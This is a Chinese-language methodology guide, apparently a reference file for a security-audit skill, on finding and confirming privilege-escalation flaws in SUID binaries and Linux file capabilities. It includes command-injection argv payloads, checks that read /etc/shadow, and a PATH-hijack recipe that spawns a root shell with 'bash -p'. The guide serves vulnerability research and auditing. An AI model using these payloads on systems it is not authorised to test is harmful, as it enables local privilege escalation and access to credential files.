# SUID / Capabilities 未授权漏洞挖掘方法

## 核心判定标准

**普通用户能否通过该 SUID/cap 执行原本需要 root 的操作 → 能 = 未授权漏洞**

次序见 SKILL.md「主流程」（唯一权威）；本文件只做 SUID/Cap 攻击面的技术细节。

```
0. 权限边界：普通用户默认能做什么？  → 基线建立（必须先做，非交互）
1. 功能识别：这个 SUID/cap 能做什么？ → 功能分析
1.5 参数首扫：argv 字符串参数打一轮注入载荷 → 先于 checksec/nm/strings（静态只定位）
2. 可达性：普通用户能调用吗？        → 调用测试
3. 影响验证：操作真的生效了吗？      → 系统级验证（marker + owner uid）
4. 权限对比：是否绕过了应有权限？    → 对比基线
```

**五步全部为 YES（且步骤 0 确认操作需要 root） → 确认未授权漏洞**

---

## 阶段零：权限边界基线（必须首先完成）

```bash
id && whoami                          # 确认为普通用户，非 root
<目标操作的非交互等价形式> 2>&1        # 应被拒绝（勿用会弹密码的命令）
pkcheck --action-id <action> --process $$   # rc=2 = 本应认证（非交互基线）
```

基线结论：`[默认需要 root]` → 继续；`[默认允许普通用户]` → 停止，判定为非漏洞。
（默认动作的正常配置；判定口径见 SKILL.md「Polkit 专项」——自定义 action 默认放行且落到特权操作仍是漏洞。）

---

## 阶段一：侦察

### 1.0 参数首扫（argv 注入，先于一切静态分析）

对可取字符串参数的 SUID/Cap 二进制，**调用时直接用注入载荷当 argv**——一次执行同时测"能否调用"与"是否注入"（调用即注入，详见 dbus-authz.md 同名节；五形载荷与引号选形同彼处）：

```bash
# 例：二进制接受文件名/路径参数
<binary> "/tmp/x; touch /tmp/inj_<tag>; #" 2>&1
ls -la /tmp/inj_<tag>   # marker 出现且 owner_uid=0 → root 命令注入
```

载荷未生效且非"参数被拒"时，按消费端引号形态换形（`'` 逃逸 / `$( )` / 反引号 / `${IFS}` / 换行）；**判"无注入"须满足证据标准**（载荷到达执行点：strace 见 execve / 构造命令见于日志）。
**此步先于 1.3-1.7 的 strings/checksec/nm 静态分析（静态只定位，不做全面反汇编/函数边界/变量追踪；先枚举输入形状）。**

### 1.1 发现目标

```bash
find / -perm -4000 -type f 2>/dev/null              # SUID
find / -perm -2000 -type f 2>/dev/null              # SGID
find / -type f -exec getcap {} + 2>/dev/null        # 文件能力
```

### 1.2 基本信息与来源

```bash
ls -la <binary>; file <binary>
rpm -qf <binary> 2>/dev/null || dpkg -S <binary> 2>/dev/null || echo NOT_IN_PACKAGE
```

### 1.3 功能识别（strings）

```bash
strings <binary> | grep -iE 'open|read|write|exec|system|popen|mount|umount|passwd|ptrace|kill|chmod'
```

### 1.4 strace 动态跟踪（按攻击面分类，避免全量噪音）

```bash
strace -e trace=open,openat,read,write <binary> <args> 2>&1            # 文件读写面
strace -e trace=execve,fork,clone,ptrace,kill <binary> <args> 2>&1     # 进程/命令面
strace -e trace=socket,bind,connect,sendto <binary> <args> 2>&1        # 网络面
strace -f -o /tmp/strace.log <binary> <args>                           # 全量落盘
```

重点看：`execve`（命令注入入口）、`open` 路径是否来自用户输入（路径遍历）、`socket`+`bind`（监听面）。

### 1.5 安全特性

```bash
checksec --file=<binary> 2>/dev/null || readelf -l <binary> | grep -E 'GNU_STACK|GNU_RELRO'
```

按常规解读：无 CANARY → 栈溢出无阻碍；GNU_STACK 含 E → 可执行栈；无 PIE → 地址固定；
无 Full RELRO → GOT 可写。内存破坏类利用难度随这些项下降。

### 1.6 导入函数

```bash
nm -D <binary> | grep " U " | sort
nm -D <binary> | grep -E " U (system|popen|exec|dlopen|ptrace)$"      # 命令/库/进程操作面
nm -D <binary> | grep -E " U (sprintf|strcpy|strcat|gets|scanf)$"     # 内存不安全函数
```

### 1.7 格式化字符串与路径

```bash
strings <binary> | grep -E '%[0-9]*\$?[sduxnp%]'        # 有用户输入作 format 参数才算漏洞
strings <binary> | grep -E '^/(etc|var|tmp|dev|sys|proc)/'  # /tmp→竞争；/etc→可控配置
```

---

## 阶段二：可达性验证

```bash
id                   # 确认普通用户
<binary> <参数>       # SUID 以 euid(root) 运行；cap 二进制普通用户直接继承能力
```

若默认需 root 的操作未要求认证即生效 → 进入影响验证。

---

## 阶段三：影响验证（系统级）

**关键原则：不依赖命令返回值，用系统级命令独立确认。**

```bash
# 读类：利用前 cat /etc/shadow 应报错；利用后与真实内容对比
cat /etc/shadow 2>&1 | head -1
md5sum /etc/shadow && wc -c /etc/shadow

# 写类：记录变更前后状态
ls -la /etc/passwd; grep 'attacker' /etc/passwd

# 进程类：利用前后 ps 对比 / ls -la /proc/<pid>/fd
# 配置类：利用前后 sysctl / cat /proc/sys/<k> 对比
# 认证类：利用前 passwd 应报错；利用后尝试用新密码登录
```

---

## 阶段四：漏洞确认与风险定级

五步全 YES → 未授权漏洞。风险定级：

| 条件 | 等级 |
|------|------|
| 普通用户可执行 root 级操作（读写任意文件、执行命令等） | P0 |
| 普通用户可执行敏感操作（修改系统配置、操作特权进程等） | P1 |
| 普通用户可执行有限特权操作（读取特定文件、操作指定资源等） | P2 |
| 仅信息泄露，无实际操作影响 | P3 |

---

## GTFOBins

遇到系统默认 SUID 二进制先查 https://gtfobins.org/ 是否有已知利用法；系统默认 SUID + 有条目 → 优先验证。

---

## 环境变量劫持 (PATH Manipulation)

**触发条件**：SUID 二进制以相对路径调用外部命令（`system("ps aux")` / `execvp("cat",…)`）。

```bash
echo -e '#!/bin/bash\n/bin/bash -p' > /tmp/ps && chmod +x /tmp/ps
export PATH=/tmp:$PATH
./vuln_suid      # 调用 "ps" 时实为 /tmp/ps → root shell
```

**检测**：`strings <binary> | grep -E '^(ps|cat|ls|grep|cp|mv|rm|sh|bash|python|perl|awk|sed|id|whoami)$'`
+ `strace -e trace=execve <binary> 2>&1 | grep 'execve("/'`。

**关键**：`bash -p` 跳过 euid≠ruid 的降权检查——普通 bash 会因 euid/ruid 不一致自动降权，-p 使其保留 SUID 的 root 身份。

---

## 相邻攻击面指引

- PolicyKit 策略审计（PolicyKit 攻击面）→ [polkit-authz.md](polkit-authz.md)
- 能力组合风险矩阵、进程内代码执行注入（LD_PRELOAD / Qt 插件目录劫持）、已知能力目标速查 → [cap-analysis.md](cap-analysis.md)

---

## 可达性回溯：疑似 sink → 攻击者入口

> **仅 SKILL.md「主流程」第 6 步情形 (b)（疑似高危入口利用失败）启用本节**；情形 (a) 只做轻量根因定位，不得展开。

逆向发现疑似危险汇点（`system`/`popen`/`exec*`/写文件/`unlink`…）后，**必须回溯它如何被进入**。只 grep 直接调用会漏判——信号/槽、回调、`std::function`、vtable 取的是**函数地址**，不是 `call`。

**反模式（禁止）**：`grep 'call.*<sink>'` 只找到一处 → 据此判定"不可达 / 仅 GUI 可达"。

**六类引用形式（仅在"疑似高危汇点且利用失败"时逐一回溯）**：

| # | 形式 | 命令 |
|---|------|------|
| a | 直接调用 | `grep -nE 'call.*<sym>' dis.txt` |
| b | **取地址（最关键）** | `grep -nE '(lea\|mov\|push).*<sym>' dis.txt`；`readelf -rW <bin> \| grep <sym>`（`.data.rel.ro` 槽 = 指针表 / vtable / std::function） |
| c | **Qt 信号/槽** | connect 站点 = 同一小段内同时出现"信号""槽"两个地址实参；`strings -a <bin> \| grep -E '^(1\|2)<name>\('`（moc 元对象 1signal/2slot）；旧式 `SIGNAL()/SLOT()`、`QMetaObject::invokeMethod` 同法 |
| d | **D-Bus / Qt 自动导出** | `busctl --user tree/introspect`；`nm -C <bin> \| grep -E 'Adaptor\|registerObject\|closeEvent\|event\(\|timerEvent'`；`org.qtproject.Qt.QWidget.close()` → `QWidget::close` → `QCloseEvent` → `closeEvent()` |
| e | 定时器/事件循环/队列 | `nm -C <bin> \| grep -E 'QTimer\|singleShot\|startTimer\|invokeMethod'`；`QueuedConnection` / `postEvent` |
| f | 配置门控分支 | 见下方"门控溯源" |

**回溯流程**：sink 符号 → 全形式引用 → 每条引用地址**回映射宿主函数**（`awk '/^[0-9a-f]+ <[^>]*>:/{fn=$0} /<ref_addr>/{print fn}' dis.txt`）→ 对宿主**递归**再问"谁进入它"（**递归=函数边界分析，仅 (b) 情形允许**）→ 终止于攻击者入口（D-Bus 方法 / Adaptor slot / 导出 event / main+argv / socket / 信号 emit），入口须**黑盒证实**。

**门控溯源（键字符串 → 全局偏移 → 判定分支）**：

```bash
strings -t x <bin> | grep '<General/key>'                    # 键字符串 vaddr
objdump -drwC -M intel <bin> | grep -nE 'lea.*# <vaddr>'      # 谁引用它（QSettings::value + toBool）
# 赋值形态: lea key; call QSettings::value; call QVariant::toBool; mov %al,0x1a(%rbp) ← 0x1a 即偏移
objdump -drwC -M intel <bin> | grep -nE '(cmp|test|movzbl).*0x1a\('   # 判定分支
```

**判定"不可达"的证据要求**：① 已排除**最相关的**引用形式（仅高危汇点场景才穷举六类，其余以**输入形状枚举**的否定证据替代）；② 至少一条黑盒证据（`strace` / 标记文件 / 状态变化）。